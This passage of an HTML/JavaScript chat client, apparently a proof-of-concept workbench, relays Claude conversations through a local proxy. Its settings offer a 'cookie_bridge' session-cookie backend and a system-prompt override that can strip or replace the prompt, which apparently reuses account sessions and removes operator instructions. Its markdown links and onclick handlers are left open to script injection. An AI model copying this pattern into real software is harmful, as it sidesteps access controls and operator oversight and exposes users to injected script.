    <div class="resize-handle" id="resize-artifact"></div>

    <!-- Artifact panel -->
    <div class="artifact-panel hidden" id="artifact-panel">
      <div class="artifact-header">
        <span class="artifact-title" id="artifact-title">Artifact</span>
        <span class="artifact-lang" id="artifact-lang">—</span>
        <button class="btn-icon" id="copy-artifact-btn" title="Copy">⎘</button>
        <button class="btn-icon" id="new-window-artifact-btn" title="Open in new window">⤢</button>
        <button class="btn-icon" id="close-artifact-btn" title="Close">✕</button>
      </div>
      <div class="artifact-version-bar" id="artifact-version-bar" style="display:none">
        <button class="version-btn" id="prev-version-btn">◀ prev</button>
        <span class="version-current" id="version-label">v1</span>
        <button class="version-btn" id="next-version-btn">next ▶</button>
        <span class="version-count" id="version-count">1 version</span>
      </div>
      <div class="artifact-tabs" id="artifact-tabs">
        <div class="artifact-tab active" data-tab="code">Code</div>
        <div class="artifact-tab" data-tab="preview">Preview</div>
      </div>
      <div class="artifact-content" id="artifact-content">
        <div class="artifact-empty">
          <div class="artifact-empty-icon">⬜</div>
          <div class="muted" style="font-size:12px">No artifact open</div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Context menu -->
<div class="ctx-menu" id="ctx-menu"></div>

<!-- Toast container -->
<div class="toast-container" id="toast-container"></div>

<!-- Search modal -->
<div class="modal-overlay" id="search-modal">
  <div class="modal" style="max-width:560px">
    <div class="modal-header">
      <span class="modal-title">Search conversations</span>
      <button class="btn-icon" onclick="App.closeSearch()">✕</button>
    </div>
    <div class="modal-body search-modal-body">
      <input type="text" id="search-input" placeholder="Search messages and titles…" style="width:100%">
      <div class="search-results" id="search-results"></div>
    </div>
  </div>
</div>

<!-- Settings panel -->
<div class="settings-overlay" id="settings-overlay">
  <div class="settings-panel">
    <div class="settings-panel-header">
      <span class="settings-panel-title">// Settings</span>
      <button class="btn-icon" onclick="App.closeSettings()">✕</button>
    </div>
    <div class="settings-body">
      <div class="settings-section">
        <div class="settings-section-label">Backend &amp; Auth</div>
        <div class="settings-row">
          <div class="settings-field">
            <label>Backend</label>
            <select id="cfg-backend" style="width:100%">
              <option value="lm_studio">LM Studio</option>
              <option value="openrouter">OpenRouter</option>
              <option value="anthropic">Anthropic API</option>
              <option value="cookie_bridge">cookie_bridge (Worker C)</option>
              <option value="custom">Custom</option>
            </select>
          </div>
          <div class="settings-field">
            <label>Auth mode</label>
            <select id="cfg-auth-mode" style="width:100%">
              <option value="no_key">no_key</option>
              <option value="api_key">api_key</option>
              <option value="oauth">oauth</option>
              <option value="cookie_bridge">cookie_bridge</option>
            </select>
          </div>
        </div>
        <div class="settings-field">
          <label>API Key (stored in Worker A, never sent here)</label>
          <input type="password" id="cfg-api-key" placeholder="sk-ant-api03-…" style="width:100%">
        </div>
        <div class="settings-field">
          <label>OAuth Token</label>
          <input type="password" id="cfg-oauth-token" placeholder="sk-ant-oat01-…" style="width:100%">
        </div>
      </div>
      <div class="settings-section">
        <div class="settings-section-label">Model &amp; System Prompt</div>
        <div class="settings-row">
          <div class="settings-field">
            <label>Default model</label>
            <select id="cfg-model" style="width:100%">
              <option value="claude-opus-4-6">Claude Opus 4.6</option>
              <option value="claude-sonnet-4-6" selected>Claude Sonnet 4.6</option>
              <option value="claude-haiku-4-5-20251001">Claude Haiku 4.5</option>
            </select>
          </div>
          <div class="settings-field">
            <label>Mutation mode</label>
            <select id="cfg-mutation" style="width:100%">
              <option value="strip_replace">strip_replace</option>
              <option value="prepend">prepend</option>
              <option value="append">append</option>
            </select>
          </div>
        </div>
        <div class="settings-field">
          <label>System prompt override (blank = disabled)</label>
          <textarea id="cfg-system-prompt" style="width:100%;min-height:80px" placeholder="Enter system prompt override…"></textarea>
        </div>
      </div>
      <div class="settings-section">
        <div class="settings-section-label">Worker A Connection</div>
        <div class="settings-row">
          <div class="settings-field">
            <label>Worker A URL</label>
            <input type="text" id="cfg-worker-a-url" style="width:100%" value="http://127.0.0.1:8787">
          </div>
          <div class="settings-field">
            <label>Worker C WS</label>
            <input type="text" id="cfg-worker-c-url" style="width:100%" value="ws://127.0.0.1:8787/ws">
          </div>
        </div>
      </div>
      <div style="display:flex;gap:8px;justify-content:flex-end;">
        <button class="btn btn-ghost" onclick="App.closeSettings()">Cancel</button>
        <button class="btn btn-accent" id="save-settings-btn">Save &amp; apply</button>
      </div>
    </div>
  </div>
</div>

<script>
'use strict';

// ================================================================
// CONSTANTS & CONFIGURATION
// ================================================================

const WORKER_A_DEFAULT = '__INJECT_WORKER_A_URL__';
const DB_NAME          = 'sister-poc-wb';
const DB_VERSION       = 1;

const MODELS = [
  { id: 'claude-opus-4-6',          name: 'Opus 4.6',    tier: 'max' },
  { id: 'claude-sonnet-4-6',        name: 'Sonnet 4.6',  tier: 'pro' },
  { id: 'claude-haiku-4-5-20251001',name: 'Haiku 4.5',   tier: 'free' },
];

// ================================================================
// STATE
// ================================================================

const State = {
  token:          null,
  account:        null,
  workerAUrl:     localStorage.getItem('wb_worker_a_url') || WORKER_A_DEFAULT,
  currentConvId:  null,
  conversations:  new Map(),   // id → { id, name, model, messages:[], created_at, updated_at, starred }
  artifacts:      new Map(),   // artifact_id → { id, title, lang, versions:[{content}], currentVersion }
  activeArtifactId: null,
  streamAbort:    null,        // AbortController for current stream
  isStreaming:    false,
  showStarredOnly: false,
  config: {
    model:         localStorage.getItem('wb_model') || 'claude-sonnet-4-6',
    mutation_mode: localStorage.getItem('wb_mutation') || 'strip_replace',
    thinking_mode: false,
    tools_enabled: false,
  },
  workerAConfig:  {},          // cached from Worker A /diag
  quickActions:   [],
};

// ================================================================
// INDEXEDDB PERSISTENCE
// ================================================================

let db = null;

function initDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NAME, DB_VERSION);
    req.onerror = () => reject(req.error);
    req.onsuccess = () => { db = req.result; resolve(db); };
    req.onupgradeneeded = (e) => {
      const d = e.target.result;
      if (!d.objectStoreNames.contains('conversations')) {
        const cs = d.createObjectStore('conversations', { keyPath: 'id' });
        cs.createIndex('updated_at', 'updated_at', { unique: false });
      }
      if (!d.objectStoreNames.contains('artifacts')) {
        d.createObjectStore('artifacts', { keyPath: 'id' });
      }
      if (!d.objectStoreNames.contains('settings')) {
        d.createObjectStore('settings', { keyPath: 'key' });
      }
    };
  });
}

function dbPut(store, value) {
  return new Promise((resolve, reject) => {
    if (!db) { resolve(); return; }
    const tx  = db.transaction(store, 'readwrite');
    const req = tx.objectStore(store).put(value);
    req.onsuccess = () => resolve(req.result);
    req.onerror   = () => reject(req.error);
  });
}

function dbGet(store, key) {
  return new Promise((resolve, reject) => {
    if (!db) { resolve(null); return; }
    const tx  = db.transaction(store, 'readonly');
    const req = tx.objectStore(store).get(key);
    req.onsuccess = () => resolve(req.result || null);
    req.onerror   = () => reject(req.error);
  });
}

function dbGetAll(store) {
  return new Promise((resolve, reject) => {
    if (!db) { resolve([]); return; }
    const tx  = db.transaction(store, 'readonly');
    const req = tx.objectStore(store).getAll();
    req.onsuccess = () => resolve(req.result || []);
    req.onerror   = () => reject(req.error);
  });
}

function dbDelete(store, key) {
  return new Promise((resolve, reject) => {
    if (!db) { resolve(); return; }
    const tx  = db.transaction(store, 'readwrite');
    const req = tx.objectStore(store).delete(key);
    req.onsuccess = () => resolve();
    req.onerror   = () => reject(req.error);
  });
}

async function persistConversation(conv) {
  const toSave = { ...conv, messages: conv.messages || [] };
  await dbPut('conversations', toSave);
}

async function persistArtifact(art) {
  await dbPut('artifacts', art);
}

async function loadPersistedData() {
  try {
    const convs = await dbGetAll('conversations');
    for (const c of convs) {
      State.conversations.set(c.id, c);
    }
    const arts = await dbGetAll('artifacts');
    for (const a of arts) {
      State.artifacts.set(a.id, a);
    }
  } catch (e) {
    console.warn('[wb] DB load error:', e);
  }
}

// ================================================================
// WORKER A API CLIENT
// ================================================================

const API = {
  _baseUrl() { return State.workerAUrl || WORKER_A_DEFAULT; },

  async _fetch(path, options = {}) {
    const url  = this._baseUrl() + path;
    const hdrs = { 'Content-Type': 'application/json', ...options.headers };
    if (State.token) hdrs['Authorization'] = 'Bearer ' + State.token;
    const resp = await fetch(url, { ...options, headers: hdrs });
    return resp;
  },

  async _json(path, options = {}) {
    const resp = await this._fetch(path, options);
    if (!resp.ok) {
      const err = await resp.json().catch(() => ({ error: resp.statusText }));
      throw new Error(err.error?.message || err.message || resp.statusText);
    }
    return resp.json();
  },

  async health()         { return this._json('/health'); },
  async diag()           { return this._json('/diag'); },
  async bootstrap()      { return this._json('/bootstrap'); },

  // Auth
  async login(email, password) {
    return this._json('/auth/login', { method: 'POST', body: JSON.stringify({ email, password }) });
  },
  async signup(email, password, name) {
    return this._json('/auth/signup', { method: 'POST', body: JSON.stringify({ email, password, name }) });
  },
  async logout() {
    try { await this._json('/auth/logout', { method: 'POST' }); } catch {}
  },

  // Conversations
  async listConvs(limit = 100) {
    return this._json('/api/organizations/ORG/chat_conversations_v2?limit=' + limit);
  },
  async createConv(model) {
    return this._json('/api/organizations/ORG/chat_conversations', {
      method: 'POST',
      body: JSON.stringify({ model: model || State.config.model }),
    });
  },
  async getConv(id) {
    return this._json('/api/organizations/ORG/chat_conversations/' + id);
  },
  async deleteConv(id) {
    const resp = await this._fetch('/api/organizations/ORG/chat_conversations/' + id, { method: 'DELETE' });
    return resp.ok;
  },
  async renameConv(id, name) {
    return this._json('/api/organizations/ORG/chat_conversations/' + id + '/title', {
      method: 'POST', body: JSON.stringify({ title: name }),
    });
  },
  async starConv(id, starred) {
    const method = starred ? 'POST' : 'DELETE';
    const resp   = await this._fetch('/api/organizations/ORG/chat_conversations/' + id + '/star', { method });
    return resp.ok;
  },

  // Completion (SSE) — returns Response
  async complete(convId, prompt, model, options = {}) {
    const url  = this._baseUrl() + '/api/organizations/ORG/chat_conversations/' + convId + '/completion';
    const body = {
      prompt,
      model:   model || State.config.model,
      tools:   options.tools || [],
      turn_message_uuids: {
        human_message_uuid:    API._uuid(),
        assistant_message_uuid: API._uuid(),
      },
    };
    const ctrl = new AbortController();
    State.streamAbort = ctrl;
    return fetch(url, {
      method:  'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept':       'text/event-stream',
        ...(State.token ? { 'Authorization': 'Bearer ' + State.token } : {}),
      },
      body:   JSON.stringify(body),
      signal: ctrl.signal,
    });
  },

  // /v1/messages completion (SSE)
  async completeV1(messages, model, options = {}) {
    const url  = this._baseUrl() + (options.thinking ? '/v1/messages/thinking' : '/v1/messages');
    const body = {
      model:      model || State.config.model,
      messages,
      max_tokens: 4096,
      stream:     true,
      ...(options.system ? { system: options.system } : {}),
      ...(options.tools?.length ? { tools: options.tools } : {}),
      ...(options.thinking ? { thinking: { type: 'enabled', budget_tokens: 2000 } } : {}),
    };
    const ctrl = new AbortController();
    State.streamAbort = ctrl;
    return fetch(url, {
      method:  'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept':       'text/event-stream',
        ...(State.token ? { 'Authorization': 'Bearer ' + State.token } : {}),
      },
      body:   JSON.stringify(body),
      signal: ctrl.signal,
    });
  },

  // Worker A config
  async saveConfig(cfg) {
    return this._json('/bridge/config', { method: 'POST', body: JSON.stringify(cfg) });
  },

  // Quick actions
  async getQuickActions() {
    try { return this._json('/quick_actions?pinned=true'); } catch { return { quick_actions: [] }; }
  },

  // Models
  async getModels() {
    try {
      const r = await this._json('/v1/models');
      return r.models || r.data || MODELS;
    } catch { return MODELS; }
  },

  // Export
  exportConvUrl(id, fmt) {
    return this._baseUrl() + '/api/organizations/ORG/chat_conversations/' + id + '/export?format=' + fmt;
  },

  _uuid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  },
};

// Replace ORG placeholder in paths
const _origFetch = API._json.bind(API);
Object.defineProperty(API, '_orgId', { get() { return State.account?.memberships?.[0]?.organization?.uuid || 'ORG'; } });
const _patchedJson = async function(path, options = {}) {
  return _origFetch(path.replace('ORG', API._orgId), options);
};
API._json = _patchedJson;
const _patchedFetch = API._fetch.bind(API);
API._fetch = async function(path, options = {}) {
  return _patchedFetch(path.replace('ORG', API._orgId), options);
};

// ================================================================
// SSE CONSUMER — handles both Anthropic and OpenAI event shapes
// ================================================================

const SSE = {
  // Read and emit events from a streaming response
  // onEvent: (type, data, accumulated) => void
  // onDone: (finalText, finalContent, stopReason) => void
  // onError: (error) => void
  async consume(response, { onText, onThinking, onToolUse, onToolInput, onDone, onError }) {
    if (!response.ok) {
      const err = await response.json().catch(() => ({}));
      onError?.(new Error(err.error?.message || 'Stream error ' + response.status));
      return;
    }

    const reader  = response.body.getReader();
    const decoder = new TextDecoder();
    let   buffer  = '';

    // Accumulated state
    let textAcc       = '';
    let thinkingAcc   = '';
    let currentTool   = null;
    let toolArgsAcc   = '';
    let stopReason    = 'end_turn';
    let inputTokens   = 0;
    let outputTokens  = 0;
    const contentBlocks = [];

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;

        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split('\\n');
        buffer = lines.pop();

        for (const rawLine of lines) {
          const line = rawLine.trim();
          if (!line) continue;

          // OpenAI format
          if (line.startsWith('data: ')) {
            const dataStr = line.slice(6).trim();
            if (dataStr === '[DONE]') {
              onDone?.({ text: textAcc, thinking: thinkingAcc, tool: currentTool ? { name: currentTool, input: SSE._parseJSON(toolArgsAcc) } : null, stopReason, inputTokens, outputTokens });
              return;
            }
            let ev;
            try { ev = JSON.parse(dataStr); } catch { continue; }

            // Anthropic SSE format
            if (ev.type) {
              switch (ev.type) {
                case 'content_block_start':
                  if (ev.content_block?.type === 'thinking') {
                    thinkingAcc = '';
                  } else if (ev.content_block?.type === 'tool_use') {
                    currentTool = ev.content_block.name;
                    toolArgsAcc = '';
                    onToolUse?.(ev.content_block.id, ev.content_block.name);
                  }
                  break;
                case 'content_block_delta':
                  if (ev.delta?.type === 'text_delta') {
                    textAcc += ev.delta.text;
                    onText?.(ev.delta.text, textAcc);
                  } else if (ev.delta?.type === 'thinking_delta') {
                    thinkingAcc += ev.delta.thinking;
                    onThinking?.(ev.delta.thinking, thinkingAcc);
                  } else if (ev.delta?.type === 'input_json_delta') {
                    toolArgsAcc += ev.delta.partial_json;
                    onToolInput?.(ev.delta.partial_json, toolArgsAcc);
                  }
                  break;
                case 'message_delta':
                  stopReason   = ev.delta?.stop_reason  || stopReason;
                  outputTokens = ev.usage?.output_tokens || outputTokens;
                  break;
                case 'message_start':
                  inputTokens  = ev.message?.usage?.input_tokens || 0;
                  outputTokens = ev.message?.usage?.output_tokens || 1;
                  break;
                case 'message_stop':
                  onDone?.({ text: textAcc, thinking: thinkingAcc, tool: currentTool ? { name: currentTool, input: SSE._parseJSON(toolArgsAcc) } : null, stopReason, inputTokens, outputTokens });
                  return;
                case 'error':
                  onError?.(new Error(ev.error?.message || 'Stream error'));
                  return;
                case 'ping':
                  break;
              }
            } else {
              // OpenAI delta format
              const choice = ev.choices?.[0];
              if (!choice) continue;
              const delta = choice.delta || {};
              if (delta.content) {
                textAcc += delta.content;
                onText?.(delta.content, textAcc);
              }
              if (delta.tool_calls) {
                for (const tc of delta.tool_calls) {
                  if (tc.function?.name && !currentTool) {
                    currentTool = tc.function.name;
                    onToolUse?.(tc.id || 'tool_' + Date.now(), tc.function.name);
                  }
                  if (tc.function?.arguments) {
                    toolArgsAcc += tc.function.arguments;
                    onToolInput?.(tc.function.arguments, toolArgsAcc);
                  }
                }
              }
              if (choice.finish_reason && choice.finish_reason !== 'null') {
                stopReason = choice.finish_reason === 'tool_calls' ? 'tool_use' : 'end_turn';
              }
            }
          }

          // Anthropic event: line format
          else if (line.startsWith('event: ')) {
            // handled in data: lines above via ev.type
          }
        }
      }
    } catch (e) {
      if (e.name !== 'AbortError') {
        onError?.(e);
      }
    }

    // Stream ended without message_stop
    onDone?.({ text: textAcc, thinking: thinkingAcc, tool: currentTool ? { name: currentTool, input: SSE._parseJSON(toolArgsAcc) } : null, stopReason, inputTokens, outputTokens });
  },

  _parseJSON(str) {
    try { return JSON.parse(str || '{}'); } catch { return {}; }
  },
};

// ================================================================
// MARKDOWN → HTML RENDERER (minimal, no dependencies)
// ================================================================

const Markdown = {
  render(text) {
    if (!text) return '';
    let html = text
      // Escape HTML entities first
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      // Code blocks (must come before other replacements)
      .replace(/\`\`\`(\\w*)\\n([\\s\\S]*?)\`\`\`/g, (_, lang, code) =>
        \`<pre><code class="lang-\${lang}">\${code.trimEnd()}</code></pre>\`)
      // Inline code
      .replace(/\`([^\`\\n]+)\`/g, '<code>$1</code>')
      // Headers
      .replace(/^### (.+)$/gm, '<h3>$1</h3>')
      .replace(/^## (.+)$/gm, '<h2>$1</h2>')
      .replace(/^# (.+)$/gm, '<h1>$1</h1>')
      // Bold
      .replace(/\\*\\*([^*]+)\\*\\*/g, '<strong>$1</strong>')
      // Italic
      .replace(/\\*([^*]+)\\*/g, '<em>$1</em>')
      .replace(/_([^_]+)_/g, '<em>$1</em>')
      // Strikethrough
      .replace(/~~([^~]+)~~/g, '<del>$1</del>')
      // Horizontal rule
      .replace(/^---+$/gm, '<hr>')
      // Blockquote
      .replace(/^> (.+)$/gm, '<blockquote>$1</blockquote>')
      // Unordered list
      .replace(/^[*-] (.+)$/gm, '<li>$1</li>')
      .replace(/(<li>[\\s\\S]*?<\\/li>)/g, '<ul>$1</ul>')
      // Ordered list
      .replace(/^\\d+\\. (.+)$/gm, '<li>$1</li>')
      // Links
      .replace(/\\[([^\\]]+)\\]\\(([^)]+)\\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>')
      // Line breaks to paragraphs
      .split('\\n\\n')
      .map(p => {
        p = p.trim();
        if (!p) return '';
        if (p.startsWith('<h') || p.startsWith('<ul') || p.startsWith('<ol') || p.startsWith('<pre') || p.startsWith('<blockquote') || p.startsWith('<hr')) return p;
        return '<p>' + p.replace(/\\n/g, '<br>') + '</p>';
      })
      .filter(Boolean)
      .join('\\n');
    // Fix nested ul (simple dedup)
    html = html.replace(/<\\/ul>\\s*<ul>/g, '');
    return html;
  },

  // Extract artifact references from text
  extractArtifacts(text) {
    const refs = [];
    const re = /\`\`\`(\\w+)\\n([\\s\\S]*?)\`\`\`/g;
    let m;
    while ((m = re.exec(text)) !== null) {
      refs.push({ lang: m[1], content: m[2], title: \`Code (\${m[1]})\` });
    }
    return refs;
  },
};

// ================================================================
// TOAST NOTIFICATIONS
// ================================================================

const Toast = {
  show(msg, type = 'info', duration = 3000) {
    const c = document.getElementById('toast-container');
    if (!c) return;
    const t = document.createElement('div');
    t.className = 'toast toast-' + type;
    t.textContent = msg;
    c.appendChild(t);
    setTimeout(() => { t.remove(); }, duration);
  },
  ok(m)   { this.show(m, 'ok'); },
  err(m)  { this.show(m, 'err', 5000); },
  info(m) { this.show(m, 'info'); },
  warn(m) { this.show(m, 'warn'); },
};

// ================================================================
// CONTEXT MENU
// ================================================================

const CtxMenu = {
  open(x, y, items) {
    const m = document.getElementById('ctx-menu');
    m.innerHTML = items.map(item => {
      if (item === '-') return '<div class="ctx-divider"></div>';
      return \`<div class="ctx-item\${item.danger ? ' danger' : ''}" data-action="\${item.action}">\${item.icon || ''} \${item.label}</div>\`;
    }).join('');
    m.style.left = Math.min(x, window.innerWidth - 180) + 'px';
    m.style.top  = Math.min(y, window.innerHeight - m.offsetHeight - 20) + 'px';
    m.classList.add('open');
    m._handlers = {};
    for (const item of items) {
      if (item !== '-' && item.handler) m._handlers[item.action] = item.handler;
    }
  },
  close() {
    const m = document.getElementById('ctx-menu');
    m.classList.remove('open');
  },
};

document.addEventListener('click', e => {
  const m = document.getElementById('ctx-menu');
  if (!m) return;
  const action = e.target.closest('.ctx-item')?.dataset.action;
  if (action && m._handlers?.[action]) {
    m._handlers[action]();
    CtxMenu.close();
  } else if (!e.target.closest('.ctx-menu')) {
    CtxMenu.close();
  }
});

// ================================================================
// RENDER: CONVERSATION LIST
// ================================================================

const ConvList = {
  render() {
    const container = document.getElementById('conv-list');
    if (!container) return;

    const query = document.getElementById('sidebar-search')?.value.toLowerCase() || '';
    let convs = [...State.conversations.values()]
      .sort((a, b) => new Date(b.updated_at) - new Date(a.updated_at));

    if (State.showStarredOnly) convs = convs.filter(c => c.starred);
    if (query) convs = convs.filter(c => (c.name || '').toLowerCase().includes(query) ||
      (c.messages || []).some(m => Chat.getMessageText(m).toLowerCase().includes(query)));

    if (!convs.length) {
      container.innerHTML = '<div class="dim" style="font-size:11px;padding:12px 14px;">No conversations</div>';
      return;
    }

    container.innerHTML = convs.map(c => {
      const isActive = c.id === State.currentConvId;
      const lastMsg  = (c.messages || []).filter(m => m.role === 'assistant').slice(-1)[0];
      const preview  = Chat.getMessageText(lastMsg).slice(0, 50) || '…';
      const age      = ConvList.timeAgo(c.updated_at);
      return \`<div class="conv-item\${isActive ? ' active' : ''}" data-id="\${c.id}" oncontextmenu="ConvList.ctxMenu(event,'\${c.id}')">
        <div class="icon">\${c.starred ? '★' : '💬'}</div>
        <div class="conv-info">
          <div class="conv-name">\${ConvList.esc(c.name || 'Untitled')}</div>
          <div class="conv-meta">\${age} · \${c.model || 'sonnet'}</div>
        </div>
        <div class="conv-actions">
          <button class="btn-icon" onclick="event.stopPropagation();ConvList.star('\${c.id}')" title="Star">\${c.starred ? '★' : '☆'}</button>
          <button class="btn-icon" onclick="event.stopPropagation();ConvList.del('\${c.id}')" title="Delete">🗑</button>
        </div>
      </div>\`;
    }).join('');

    container.querySelectorAll('.conv-item').forEach(el => {
      el.addEventListener('click', () => App.loadConversation(el.dataset.id));
    });
  },

  ctxMenu(e, id) {
    e.preventDefault();
    const conv = State.conversations.get(id);
    CtxMenu.open(e.clientX, e.clientY, [
      { label: 'Open',             icon: '↗', action: 'open',   handler: () => App.loadConversation(id) },
      { label: 'Rename',           icon: '✎', action: 'rename', handler: () => ConvList.rename(id) },
      { label: conv?.starred ? 'Unstar' : 'Star', icon: '★', action: 'star', handler: () => ConvList.star(id) },
      '-',
      { label: 'Export JSON',      icon: '⬇', action: 'expj',  handler: () => window.open(API.exportConvUrl(id, 'json')) },
      { label: 'Export Markdown',  icon: '⬇', action: 'expmd', handler: () => window.open(API.exportConvUrl(id, 'markdown')) },
      '-',
      { label: 'Delete',           icon: '🗑', action: 'del',  handler: () => ConvList.del(id), danger: true },
    ]);
  },

  async star(id) {
    const conv = State.conversations.get(id);
    if (!conv) return;
    conv.starred = !conv.starred;
    await persistConversation(conv);
    await API.starConv(id, conv.starred).catch(() => {});
    ConvList.render();
  },

  rename(id) {
    const conv = State.conversations.get(id);
    const name = prompt('Rename conversation:', conv?.name || '');
    if (!name) return;
    if (conv) {
      conv.name = name;
      persistConversation(conv);
      ConvList.render();
      if (id === State.currentConvId) document.getElementById('conv-title').textContent = name;
    }
    API.renameConv(id, name).catch(() => {});
  },

  async del(id) {
    if (!confirm('Delete this conversation?')) return;
    await API.deleteConv(id).catch(() => {});
    State.conversations.delete(id);
    await dbDelete('conversations', id);
    if (id === State.currentConvId) App.newConversation();
    else ConvList.render();
    Toast.ok('Conversation deleted');
  },

  timeAgo(iso) {
    if (!iso) return 'now';
    const diff = Date.now() - new Date(iso).getTime();
    if (diff < 60000)   return 'just now';
    if (diff < 3600000) return Math.floor(diff / 60000) + 'm';
    if (diff < 86400000)return Math.floor(diff / 3600000) + 'h';
    return Math.floor(diff / 86400000) + 'd';
  },

  esc(str) {
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  },
};

// ================================================================
// RENDER: CHAT MESSAGES
// ================================================================

const Chat = {
  getMessageText(msg) {
    if (!msg) return '';
    if (typeof msg.text === 'string') return msg.text;
    if (typeof msg.content === 'string') return msg.content;
    if (Array.isArray(msg.content)) {
      return msg.content.filter(b => b.type === 'text').map(b => b.text).join('\\n');
    }
    return '';
  },

  renderAll(conv) {
    const container = document.getElementById('messages');
    const empty     = document.getElementById('empty-state');
    if (!conv || !(conv.messages || []).length) {
      container.style.display = 'none';
      empty.style.display     = '';
      return;
    }
    container.style.display = '';
    empty.style.display     = 'none';
    container.innerHTML     = '';
    for (const msg of conv.messages) {
      container.appendChild(Chat.renderMessage(msg));
    }
    container.scrollTop = container.scrollHeight;
  },

  renderMessage(msg) {
    const div    = document.createElement('div');
    const role   = msg.role === 'user' ? 'human' : 'assistant';
    const text   = Chat.getMessageText(msg);
    const time   = new Date(msg.created_at || Date.now()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const model  = msg.model || '';
    const initials = role === 'human' ? 'HU' : 'AI';

    div.className = 'msg';
    div.dataset.id = msg.uuid || '';

    // Check for thinking content
    const hasThinking = Array.isArray(msg.content) && msg.content.some(b => b.type === 'thinking');
    const thinkingText = hasThinking ? msg.content.find(b => b.type === 'thinking')?.thinking || '' : '';

    // Check for tool use
    const hasToolUse = Array.isArray(msg.content) && msg.content.some(b => b.type === 'tool_use');
    const toolBlock  = hasToolUse ? msg.content.find(b => b.type === 'tool_use') : null;

    const thinkingHtml = thinkingText ? \`
      <div class="thinking-block" onclick="this.classList.toggle('expanded')">
        <div class="thinking-header">Extended thinking · \${thinkingText.length} chars</div>
        <div class="thinking-content">\${ConvList.esc(thinkingText)}</div>
      </div>\` : '';

    const toolHtml = toolBlock ? \`
      <div class="tool-block">
        <div class="tool-header">Tool call: \${ConvList.esc(toolBlock.name)}</div>
        <div class="tool-input">\${ConvList.esc(JSON.stringify(toolBlock.input, null, 2))}</div>
      </div>\` : '';

    // Extract inline artifacts from text
    const artifacts = text ? Markdown.extractArtifacts(text) : [];
    const artifactBtns = artifacts.map((art, i) => {
      const artId = 'art_' + (msg.uuid || Date.now()) + '_' + i;
      return \`<div class="artifact-ref" onclick="ArtifactPanel.open('\${artId}', '\${ConvList.esc(art.title)}', '\${ConvList.esc(art.lang)}', '\${btoa(encodeURIComponent(art.content))}')"><span class="art-icon">⬜</span> \${ConvList.esc(art.title)}</div>\`;
    }).join('');

    // Render markdown (strip code blocks since they're shown as artifacts)
    const displayText = text.replace(/\`\`\`[\\s\\S]*?\`\`\`/g, '[See artifact above]');
    const htmlContent = Markdown.render(displayText);

    div.innerHTML = \`
      <div class="msg-avatar \${role}">\${initials}</div>
      <div class="msg-body">
        <div class="msg-header">
          <span class="msg-role \${role}">\${role === 'human' ? 'Human' : 'Assistant'}</span>
          <span class="msg-time">\${time}</span>
          \${model ? \`<span class="msg-model">\${model}</span>\` : ''}
        </div>
        \${thinkingHtml}
        \${toolHtml}
        <div class="msg-content">\${htmlContent}</div>
        \${artifactBtns}
      </div>\`;
    return div;
  },

  // Append a new streaming message, returns { el, textEl, thinkingEl }
  appendStreamingMessage(role, model) {
    const container = document.getElementById('messages');
    const empty     = document.getElementById('empty-state');
    container.style.display = '';
    empty.style.display     = 'none';

    const div = document.createElement('div');
    div.className = 'msg streaming';
    const initials = role === 'human' ? 'HU' : 'AI';

    const thinkingWrap = document.createElement('div');
    thinkingWrap.className = 'thinking-block';
    thinkingWrap.style.display = 'none';
    const thinkingHeader = document.createElement('div');
    thinkingHeader.className = 'thinking-header';
    thinkingHeader.textContent = 'Extended thinking…';
    thinkingHeader.onclick = () => thinkingWrap.classList.toggle('expanded');
    const thinkingContent = document.createElement('div');
    thinkingContent.className = 'thinking-content';
    thinkingWrap.appendChild(thinkingHeader);
    thinkingWrap.appendChild(thinkingContent);

    const toolWrap = document.createElement('div');
    toolWrap.className = 'tool-block';
    toolWrap.style.display = 'none';

    const textDiv = document.createElement('div');
    textDiv.className = 'msg-content';
    textDiv.innerHTML = '<span class="cursor-blink"></span>';

    div.innerHTML = \`<div class="msg-avatar \${role}">AI</div><div class="msg-body"><div class="msg-header"><span class="msg-role \${role}">\${role === 'human' ? 'Human' : 'Assistant'}</span><span class="msg-time">\${new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'})}</span>\${model ? \`<span class="msg-model">\${model}</span>\` : ''}</div></div>\`;
    const body = div.querySelector('.msg-body');
    body.appendChild(thinkingWrap);
    body.appendChild(toolWrap);
    body.appendChild(textDiv);
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;

    return { el: div, textEl: textDiv, thinkingEl: { wrap: thinkingWrap, header: thinkingHeader, content: thinkingContent }, toolEl: toolWrap };
  },

  scrollToBottom() {
    const c = document.getElementById('messages');
    if (c) c.scrollTop = c.scrollHeight;
  },
};

// ================================================================
// ARTIFACT PANEL
// ================================================================

const ArtifactPanel = {
  open(id, title, lang, encodedContent) {
    let content;
    try { content = decodeURIComponent(atob(encodedContent)); }
    catch { content = encodedContent; }

    let art = State.artifacts.get(id);
    if (!art) {
      art = { id, title, lang, versions: [{ content, created_at: new Date().toISOString() }], currentVersion: 0 };
      State.artifacts.set(id, art);
      persistArtifact(art);
    }
    State.activeArtifactId = id;
    ArtifactPanel.render();
  },

  addVersion(id, title, lang, content) {
    let art = State.artifacts.get(id);
    if (!art) {
      art = { id, title, lang, versions: [], currentVersion: 0 };
      State.artifacts.set(id, art);
    }
    art.versions.push({ content, created_at: new Date().toISOString() });
    art.currentVersion = art.versions.length - 1;
    art.title = title || art.title;
    art.lang  = lang  || art.lang;
    persistArtifact(art);
    if (State.activeArtifactId === id) ArtifactPanel.render();
  },

  render() {
    const panel = document.getElementById('artifact-panel');
    if (!State.activeArtifactId) {
      panel.classList.add('hidden');
      return;
    }
    const art = State.artifacts.get(State.activeArtifactId);
    if (!art) { panel.classList.add('hidden'); return; }

    panel.classList.remove('hidden');
    document.getElementById('artifact-title').textContent = art.title || 'Artifact';
